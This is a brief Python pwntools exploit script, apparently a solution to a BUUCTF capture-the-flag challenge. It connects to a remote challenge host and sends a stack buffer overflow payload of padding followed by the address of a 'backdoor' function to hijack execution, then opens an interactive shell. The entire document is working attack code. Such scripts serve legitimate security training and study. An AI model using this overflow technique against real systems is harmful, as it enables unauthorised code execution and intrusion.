from pwn import *

p = remote("node4.buuoj.cn",29667)
context.log_level = "debug"

backdoor = 0x4006E6

p.recvuntil("Please input the length of your name:\n")
p.sendline("50")
p.recv()
payload = b'a' * (0x10 + 8) + p64(backdoor)
p.sendline(payload)

p.interactive()
